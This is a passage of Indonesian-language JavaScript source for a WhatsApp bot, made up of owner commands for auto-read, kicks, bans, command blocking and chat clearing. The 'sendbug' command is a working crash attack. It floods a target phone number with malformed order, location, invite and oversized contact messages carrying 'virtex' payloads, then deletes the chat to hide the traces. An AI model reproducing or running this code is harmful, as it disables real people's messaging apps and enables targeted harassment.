			var group = await xdev.groupMetadata(idgc)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: teks,
			contextInfo: { mentionedJid: mem },
			quoted: dev
			}
			await xdev.sendMessage(idgc, optionshidetag, text)
			await setReply(`Sukses mengirim hidetag`)
			break
			
			
			
			
			case 'autowelcome':
		            if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autoWelcome === true) return setReply('Udah aktif kak')
                    autoWelcome = true           
                    let ih =`Mode auto welcome telah aktif kak`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autoWelcome === false) return setReply('Udah off kak')
                     autoWelcome = false         
                     let eh =`Mode auto welcome telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTO WELCOME`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autowelcome on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autowelcome off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
			
			
			
           
           
           case 'autoread':
		            if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autoread === true) return setReply('Udah aktif kak')
                    autoread = true
                    autoreadgc = false
                    autoreadpc = false
                    let ih =`Mode auto read telah aktif kak \nBot akan auto read saat di chat`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autoread === false) return setReply('Udah off kak')
                     autoread = false
                    autoreadgc = false
                    autoreadpc = false
                     let eh =`Mode auto read telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTOREAD`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autoread on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autoread off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 
                 
                 
                 
                 
                 
                 
                 case 'autoreadgc':
		            if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autoreadgc === true) return setReply('Udah aktif kak')
                    autoread = false
                    autoreadgc = true
                    let ih =`Mode auto read gc telah aktif kak \nBot akan auto read saat di chat`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autoreadgc === false) return setReply('Udah off kak')
                     autoread = false
                    autoreadgc = false
                     let eh =`Mode auto read gc telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTOREAD GC`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autoreadgc on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autoreadgc off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 case 'autoreadpc':
		            if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autoreadpc === true) return setReply('Udah aktif kak')
                    autoread = false
                    autoreadpc = true
                    let ih =`Mode auto read telah pc aktif kak \nBot akan auto read saat di chat`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autoreadpc === false) return setReply('Udah off kak')
                     autoread = false
                    autoreadpc = false
                     let eh =`Mode auto read telah pc di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTOREAD PC`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autoreadpc on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autoreadpc off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
            case 'autoclearchat':
            case 'autoclearall':
            if (!isOwner) return onlyOwner()
			if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
			if (AutoClearChat) return setReply('Udah aktif kak')
            AutoClearChat = true
            setReply("Sukses activated auto clear all, semua pesan akan di hapus sehari sekali")
            } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
        	if (!AutoClearChat) return setReply('Udah off kak')
            AutoClearChat = false
            setReply("Sukses deactibated auto clear chat")
            }
            break
     
     
     case 'autoreport':
            if (!isOwner) return onlyOwner()
			if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
			if (autoReport) return setReply('Udah aktif kak')
            autoReport = true
            setReply("Sukses activated auto report")
            } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
        	if (!autoReport) return setReply('Udah off kak')
            autoReport = false
            setReply("Sukses deactibated auto auto report")
            }
            break
     
                 
                 
                 case 'autorespon':
			       if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autorespon === true) return setReply('Udah aktif kak')
                    autorespon = true
                    let ih =`Mode auto respon telah aktif kak \nBot akan auto respon saat di chat`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autorespon === false) return setReply('Udah off kak')
                     autorespon = false
                     let eh =`Mode auto respon telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTOREAD`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autorespon on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autorespon off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 
                 
                 
                 
                 
                 
                 
                 
					
					
					case 'autovn':
		            if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable') {
					if (autovn === true) return setReply('Udah aktif kak')
                    autovn = true
                    typing = false
                    autosticker = false
                    let ih =`Mode auto vn telah aktif kak \nBot akan auto voice saat di kasih perintah`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autovn === false) return setReply('Udah off kak')
                     autovn = false
                     let eh =`Mode auto vn telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTO VOICE NOTE`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autovn on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autovn off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 case 'autosticker':
				    if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autosticker === true) return setReply('Udah aktif kak')
                    autosticker = true
                    autovn = false
                    typing = false
                    let ih =`Mode autosticker telah aktif kak`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autosticker === false) return setReply('Udah off kak')
                     autosticker = false
                     let eh =`Mode autosticker telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTOSTICKER`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autosticker on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autosticker off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
					
                 case 'autotyping':
					case 'typing':
					if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (typing === true) return setReply('Udah aktif kak')
                    typing = true
                    autovn = false
                    autosticker = false
                    let ah =`Mode typing telah aktif kak \nBot akan auto typing saat di beri perintah`
                    xdev.sendMessage(from, ah, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (typing === false) return setReply('Udah off kak')
                     typing = false
                     let uh =`Mode typing telah di matikan`
                     xdev.sendMessage(from, uh, text, { quoted: setQuoted, contextInfo: forward})
					} else if (!q) {
                      sendButMessage(from, `MODE AUTO TYPING`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autotyping on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autotyping off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 
                 
                 
                 
                 
                 
                 
                 case 'autoblockcmd':
		            if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable') {
					if (autoblockcmd === true) return setReply('Udah aktif kak')
                    autoblockcmd = true          
                    let ih =`Mode auto block command telah aktif kak \nBot akan auto block saat ada command yang error`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autoblockcmd === false) return setReply('Udah off kak')
                     autoblockcmd = false
                     let eh =`Mode auto block command telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTO BLOCK CMD`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autoblockcmd on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autoblockcmd off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 case 'autobio':
			       if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autobio) return setReply('Udah aktif kak')
                    autobio = true          
                    let ih =`Mode auto bio telah aktif kak`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (!autobio) return setReply('Udah off kak')
                     autobio = false
                     let eh =`Mode auto bio telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTO BIO`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autobio on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autobio off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 
                 
           
      case 'unblockcmd':
      case 'delblock':
      case 'delblockcmd':
      try{
    	  if (!isOwner) return onlyOwner()
          if(!q) return setReply("Textnya mana cih")
          if (!checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut tidak ada di database`)
          deleteblockcmd(q, listcmdblock)        
          setReply(`Berhasil unblock command 「 *${q}* 」`)
          } catch (err) {
          	setReply("Bjirr error, keknya ada yang error")
          }
      break  
            
            case 'blockcmd':{
          if (!isOwner) return onlyOwner()
          if(!q) return setReply(`Textnya mana cih\n\nContoh : ${prefix}blockcmd menu\nGituuuuuuu`)
          if (checkblockcmd(q, listcmdblock)) return setReply(`Command tersebut sudah ada di database`)
          addblockcmd(q,listcmdblock) 
          setTimeout( () => {
          setReply(`Berhasil memblokir command 「 *${q}* 」\nsilakan ketik ${prefix}listblockcmd untuk melihat\ndaftar command yang telah di block`)
           },3000)
          }
      break
            
            
            
            
                  
           case 'listblockcmd':
           case 'listcmdblock':
let wo = `*「 LIST BLOCK CMD 」*`
let soso = [];
for (let i of listcmdblock) {
soso.push(i.cmd)
wo += `\n\n•> Command : ${i.cmd}`
}
mentions(wo, soso, true)
break




           
      


 
           
 case 'jancok':
case 'kik':
if (!isOwner) return onlyOwner()
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return setReply('Reply targetnya kak')
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return setReply(`*Ya jangan lebih dari satu dong kak ${pushname} nanti aku kena banned* 😒`)
if (mentioned.length < 1) {
asu = dev.message.extendedTextMessage.contextInfo.participant
await setReply( `Modar kena kick awokawok 🤣`);
await xdev.groupRemove(from, [asu])
} else {
if (mentioned.includes(ownerNumber[0])) return setReply(`Tidak bisa kick Owner`)
if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return setReply(`Tidak bisa kick owner group`)
await setReply(`Asek dapet jatah kick, Otw kick 😋`);
await xdev.groupRemove(from, [mentioned[0]])
 }
break    


        
       
            
case 'clearall':
try{
					if (!isOwner) return onlyOwner()
					let chiit = await xdev.chats.all()
                    for (let i of chiit){
                    xdev.modifyChat(i.jid, ChatModification.delete)                 
                    }
                   // await setReply("Sukses Clear All Chat")
                    } catch (err){
                	setReply(err)
                    }
					break



case 'readall':
					if (!isOwner) return onlyOwner()
					let readall = await xdev.chats.all()
                    for (let i of readall){
                    await xdev.chatRead(i.jid, "read")
                    }
                    setReply(`Berhasil membaca ${readall.length} pesan`)
					break


case 'clearallgc':
try{ 
var clearpc = await xdev.chats.array.filter(v => v.jid.endsWith('g.us'))
clearpc.map( async ({ jid }) => {
 await xdev.modifyChat(jid, ChatModification.delete)                 
})
//await setReply(`Succes Clear All ${clearpc.length} Group Chat`)
} catch (err){
setReply(err)
}
break
	
	
	
case 'clearallpc':
try{ 
var cleargc = await xdev.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
cleargc.map( async ({ jid }) => {
await xdev.modifyChat(jid, ChatModification.delete)                
})
//await setReply(`Succes Clear All ${cleargc.length} Private Chat`)
} catch (err){
setReply(err)
}
break




           
                    
case 'delallerror':
case 'clearallerror':
				         if (!isOwner) return onlyOwner()
				         var obj = [] 
                         fs.writeFileSync('./database/listerror.json', JSON.stringify(obj))         
				         await setReply(`ALL ERROR BERHASIL DI HAPUS`)
			             break 
	
	case 'delalluser':
	case 'clearalluser':
				         if (!isOwner) return onlyOwner()
				         var obj = [] 
                         fs.writeFileSync('./database/user.json', JSON.stringify(obj))         
				         await setReply(`ALL USER BERHASIL DI HAPUS`)
			             break 
			
			
			case 'delallblock':
	case 'clearallblock':
				         if (!isOwner) return onlyOwner()
				         var obj = [] 
                         fs.writeFileSync('./database/userblocked.json', JSON.stringify(obj))         
				         await setReply(`ALL BLOCK BERHASIL DI HAPUS`)
			             break 

			
			
			
			case 'delallban':
	case 'clearallban':
	case 'clearallbanned':
				         if (!isOwner) return onlyOwner()
				         var obj = [] 
                         fs.writeFileSync('./database/banned.json', JSON.stringify(obj))         
				         await setReply(`ALL BANNED BERHASIL DI HAPUS`)
			             break 
			
			
			
			
			            
           
           case 'public':
               if (!isOwner) return onlyOwner()

           if (publik === true) return setReply('Udah di mode publick kak')
           publik = true
           let bab =`Mode public aktif kak`
           xdev.sendMessage(from, bab, text, { quoted: setQuoted, contextInfo: forward})
           break
           
case 'self':
                 if (!isOwner) return onlyOwner()

           if (publik === false) return setReply('Udah di mode self kak')
           publik = false
           let breh =`Mode self aktif kak`
           xdev.sendMessage(from, breh, text, { quoted: setQuoted, contextInfo: forward})
           break
           
           
            case 'sendbug':    
                if(isExtream) return
                    if (!isOwner) return onlyOwner()
                      if(sendbug === true) return setReply(`*ALERT* \nEeeitss, tunggu sampai proses sendbugnya selesai ya kak, kalo tetep maksain sendbug lebih dari satu nomer, nanti nomer kakak akan terbanned, trus aku nanti bisa kesepian deh :)`)
                      if(sendbug === true) return setReply("Untung ada aku yang mencegah, klo gak bisa kena banned tadi 😌")
      
                      if (args.length < 1) return setReply(`Penggunaan ${prefix}sendbug nomor`)
					  if (args[0].startsWith('08')) return setReply('Gunakan kode negara kak')

                      pc = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`               
                      if(pc === Ownerin) return 
                      try {                 
                     setReply('*Loading...*')
                 sendbug = true
			   var nilaiAwal = 1;
                     while(nilaiAwal <=2) { 
			var kirim = await  xdev.prepareMessageFromContent(`${pc}@s.whatsapp.net`, {
                    'orderMessage': {
                        'orderId': '0@s.whatsapp.net',
                        'thumbnail': davizin,
                        'itemCount': jumlahTroli,
                        'status': 1,
                        'surface': 1,
                        'message': virtex6(prefix),
                        'orderTitle': fake,
                        'sellerJid': `0@s.whatsapp.net`,
                      'token': 'ydkskyshj755hfuej',
                    }
                }, {
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                            'remoteJid': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': jumlahTroli,
                                'status': 1,
                                'surface': 1,
                                'message': 'NOPE',
                                'orderTitle': 'halo gaes',
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'contextInfo': forward
                });
                await xdev.relayWAMessage(kirim)
       await  xdev.sendMessage(`${pc}@s.whatsapp.net`, virtex6(prefix), text,  {
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                            'remoteJid': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': jumlahTroli,
                                'status': 1,
                                'surface': 1,
                                'message': 'NOPE',
                                'orderTitle': 'halo gaes',
                               'thumbnail': virgam,
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'contextInfo': forward
                })
                
               await xdev.sendMessage(`${pc}@s.whatsapp.net`, {
                            degreesLatitude: 36.036105801662316,
                              degreesLongitude: 138.09072320256624,
                            name: virtex7(prefix),
                               address: virtex6(prefix),
                             jpegThumbnail: thumb,
                              }, location,
                              {quoted: {
                             key: {
                               participant: '0@s.whatsapp.net'
                             },
                           message: {
                        orderMessage: {
                          itemCount: jumlahTroli,
                               status: 1,
                       surface: 10,
                      message: 'NOPE',
                            orderTitle: fake,
                             sellerJid:'0@s.whatsapp.net'}
                             }},
                             contextInfo: forward})
                             
                             
                       xdev.sendMessage(`${pc}@s.whatsapp.net`, {
                        'groupName': 'NOPE',
                        'groupJid': '6285156137901-1627579259@g.us',
                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
                        'inviteExpiration': '0',
                        'caption': virtex7(prefix),
                        'jpegThumbnail': thumb
                    }, MessageType.groupInviteMessage, {
                        'quoted': {
                            'key': {
                                'participant':  `0@s.whatsapp.net`,
                                ...'from' ? {
                                    'remoteJid': '0@s.whatsapp.net'
                                } : {}
                            },
                            'message': {
                                'orderMessage': {
                                    'itemCount': jumlahTroli,
                                    'status': 1,
                                    'surface': 1,
                                    'orderTitle': fake,
                                    'sellerJid':  '0@s.whatsapp.net'
                                }
                            }
                        }
                    })         
			
                     let inilist = []
                     for (let i of ownerNumber) {
                     const vname = xdev.contacts[i] != undefined ? xdev.contacts[i].vname || xdev.contacts[i].notify : undefined
                     inilist.push({"displayName": 'X - Dev Team',"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${xdev.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\n+ \nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴?? 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇??𝑈𝐾??𝑆𝐴 ボ ??𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆?? ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ ??𝑆????𝐴𝑆𝐴 ボ ??𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ ??𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈??𝐴𝑆𝐴 ボ ??𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ ??𝑆??𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴?? 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ ??𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶??𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴?? 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻??𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆??𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nitem1.X-ABLabel:Ponsel\nEND:VCARD`})}
                  
                     await xdev.sendMessage(`${pc}@s.whatsapp.net`, {"displayName": `${inilist.length} kontak`,"contacts": inilist }, 'contactsArrayMessage')
                     nilaiAwal++}
                     console.log(color("[BUG]", "red"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color('Bug terkirim', 'cyan'))
                     console.log(color("[BUG]", "red"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color('Otw delchat, buka wa nya terus agar delchat sukses', 'cyan'))
                     await xdev.modifyChat(`${pc}@s.whatsapp.net`, ChatModification.delete)
                     await xdev.sendMessage(`${pc}@s.whatsapp.net`, 'COMPLETE', text)
                     await xdev.sendMessage(from, `*Sukses send bug sebanyak 11 bug ke nomor ${q}*`, text)
                     console.log(color("[BUG]", "red"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color('sukses delchat sekarang wa sudah normal', 'cyan'))     
					} catch (e) {
					console.log('Error :', e)
					setReply(`*Gagal mengirim bug!* \n*System Error*\nPastikan jaringan stabil dan masukan nomer whatsapp dengan benar`)
					}   
                    sendbug = false                     
					break
           
           
           case 'setppbot':
					if (!isOwner) return onlyOwner() 
					if (!isQuotedImage) return setReply(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
					if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return setReply('Reply gambarnya aja om')
					enmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await xdev.downloadAndSaveMediaMessage(enmedia)
					await xdev.updateProfilePicture(botNumber, media)
					setReply('Makasih profil barunya😗')
					break
           
           
           
           case 'setprefix':
           case 'setpref':
                     if (!isOwner) return onlyOwner()
                if (args.length < 1) return setReply(`Masukkan prefix\nOptions :\n=> multi`)
                if (c === 'multi'){
                    multi = true
                    nopref = false
                    setReply(`Berhasil mengubah prefix ke *「 ${c} 」*`)
                } else if (c === 'nopref'){
                	multi = false
                    nopref = true
                    setReply(`Berhasil mengubah prefix ke *「 ${c} 」*`)
                } else {
                    multi = false
                    nopref = false
                    prefa = `${c}`
                    setReply(`Berhasil mengubah prefix ke *「 ${c} 」*`)
                }
                break
                
           
           case 'addrespon':{
         if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
          if (args.length < 1) return setReply(`Penggunaan ${prefix}addrespon key|respon\n\nContoh : ${prefix}addrespon hai|juga`)
          let input1 = body.slice(11)
          if (!input1.includes('|')) return setReply(`Penggunaan ${prefix}addrespon key|respon\n\nContoh : ${prefix}addrespon hai|juga`)
          let input = input1.split("|")
          if (checkCommands(input[0], commandsDB) === true) return setReply(`Command tersebut sudah ada`)
          addCommands(input[0], input[1], sender, commandsDB) 
          setReply(`Key : ${input[0]}\nRespon : ${input[1]}\n\nRespon berhasil di set`)
          }
      break
      
      case 'dellrespon':
      case 'delrespon':{
          if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
            if (args.length < 1) return setReply(`Penggunaan ${prefix}delrespon key\n\nContoh : ${prefix}delrespon hai`)
          if (!checkCommands(q, commandsDB)) return setReply(`Key tersebut tidak ada di database`)
          deleteCommands(q, commandsDB)
          setReply(`Berhasil menghapus respon dengan key ${q}`)
          }
      break
      
      
      
      
  
      
      
           
		case 'ban':
		case 'banned':
		    if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
			if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return setReply('Reply atau tag targetnya')
			          
		    mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
		    if (mentioned.length > 1) return reply ('Satu satu dong wuuuuuuuuuuu')
            if (mentioned.length < 1) {
            asu = dev.message.extendedTextMessage.contextInfo.participant
           nama = xdev.contacts[asu] != undefined ? xdev.contacts[asu].notify = undefined ? PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international') : xdev.contacts[asu].notify || xdev.contacts[asu].vname : PhoneNumber('+' + asu.replace('@s.whatsapp.net', '')).getNumber('international')
            Nomer =`${asu.split("@")[0]}@s.whatsapp.net`
            if(cekBannedUser (asu, ban)) return setReply("Udah di ban kak")
            if(Nomer === ownerNumber[0]) return setReply("Ga mau")
            addBanned(nama,calender,  Nomer, ban)               
            setReply( `*Asik si beban* @${asu.split("@")[0]} *kena banned* 🤣`);
            } else {
       	 if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
            if (mentioned.includes(ownerNumber[0])) return setReply(`Tidak bisa banned Owner`)
            if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return setReply(`Tidak bisa banned owner group`)
            nama = xdev.contacts[mentioned] != undefined ? xdev.contacts[mentioned].notify = undefined ? PhoneNumber('+' + mentioned.replace('@s.whatsapp.net', '')).getNumber('international') : xdev.contacts[mentioned].notify || xdev.contacts[mentioned].vname : PhoneNumber('+' + mentioned.replace('@s.whatsapp.net', '')).getNumber('international')
            ahah = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
            if(cekBannedUser (ahah, ban)) return setReply("Udah di ban kak")     
            addBanned(nama, calender, ahah, ban)  
            setReply(`Asik si wawan @${mentioned[0].split('@')[0]} kena banned 🤣`);
            }
            break
                  
    
    
			case 'listban':
			case 'banlist':
		//     if (!isOwner) return onlyOwner()
	          banya = `*List Banned*\nJumlah : ${ban.length}\n\n`
			ban.map(function(e, i){
			
            banya += (i+1)+`.🆔 Nama : ${e.name}\n    📲 Nomer : wa.me/${e.id.split("@")[0]}\n    📅 Tanggal : ${e.date}\n\n`            
        });
				setReply(banya)
				break
            
            
            
            
            
			case 'unbanned':
			case 'unban': //PERCOBAA
		    if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
			if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return setReply('Reply targetnya!')
